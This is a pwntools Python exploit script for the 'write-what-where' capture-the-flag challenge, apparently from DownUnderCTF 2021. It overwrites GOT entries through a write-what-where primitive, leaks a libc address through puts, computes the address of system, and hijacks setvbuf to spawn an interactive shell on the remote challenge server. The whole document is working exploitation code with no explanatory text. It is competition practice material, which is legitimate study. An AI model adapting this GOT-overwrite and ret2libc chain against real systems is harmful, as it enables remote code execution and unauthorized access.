from pwn import *  # Import pwntools
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './write-what-where_patched'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('pwn-2021.duc.tf', 31920) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *init')



##########################
##### OFFSET FINDER ######
##########################



#####################
#### Find Gadgets ###
#####################

MAIN_PLT = ELF_LOADED.symbols['main']
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep 'pop rdi'
RET = (ROP_LOADED.find_gadget(['ret']))[0]

log.info('Main start: ' + hex(MAIN_PLT))
log.info('pop rdi; ret  gadget: ' + hex(POP_RDI))
log.info('ret gadget: ' + hex(RET))


#########################
#### Finf LIBC offset ###
#########################


##############################
##### FINAL EXPLOITATION #####
##############################

BINSH = next(LIBC.search(b'/bin/sh')) #Verify with find /bin/sh
SYSTEM = LIBC.sym['system']
EXIT = LIBC.sym['exit']
payload1 = (p32(0x4011ca)+str(ELF_LOADED.got['exit']).encode()).ljust(13,b'A')
payload2 = (p32(ELF_LOADED.plt['puts'])+str(ELF_LOADED.got['setvbuf']).encode()).ljust(13,b'A')
payload3 = (p32(0)+str(ELF_LOADED.got['setvbuf']+0x4).encode()).ljust(13,b'A')
payload4 = (p32(ELF_LOADED.got['puts'])+str(ELF_LOADED.got['stdin']).encode()).ljust(13,b'A')
payload5 = (p32(0)+str(ELF_LOADED.got['stdin']+0x4).encode()).ljust(13,b'A')
payload6 = (p32(ELF_LOADED.sym['main'])+str(ELF_LOADED.got['exit']).encode()).ljust(13,b'A')

P.send(payload1)
P.send(payload2)
P.send(payload3)
P.send(payload4)
P.send(payload5)
P.send(payload6)

leak = P.recvline().strip()
while b'w' in leak:
    leak = P.recvline().strip()
print(hex(u64(leak.ljust(8,b'\x00'))))
LIBC.address = u64(leak.ljust(8,b'\x00'))-0x809d0
system = LIBC.sym['system']
write1 = system%0x100000000
write2 = int(system/0x100000000)
payload11 = (p32(0x4011ca)+str(ELF_LOADED.got['exit']).encode()).ljust(13,b'A')
payload12 = (p32(write1)+str(ELF_LOADED.got['setvbuf']).encode()).ljust(13,b'A')
payload13 = (p32(write2)+str(ELF_LOADED.got['setvbuf']+0x4).encode()).ljust(13,b'A')
payload14 = (p32(0x404040)+str(ELF_LOADED.got['stdin']).encode()).ljust(13,b'A')
payload15 = (b'sh\x00\x00'+str(0x404040).encode()).ljust(13,b'A')
payload16 = (b'fla*'+str(0x404044).encode()).ljust(13,b'A')
payload17 = (p32(ELF_LOADED.sym['main'])+str(ELF_LOADED.got['exit']).encode()).ljust(13,b'A')
P.send(payload11)
P.send(payload12)
P.send(payload13)
P.send(payload14)
P.send(payload15)
#P.send(payload16)
P.send(payload17)

P.interactive() #Interact with your shell :)
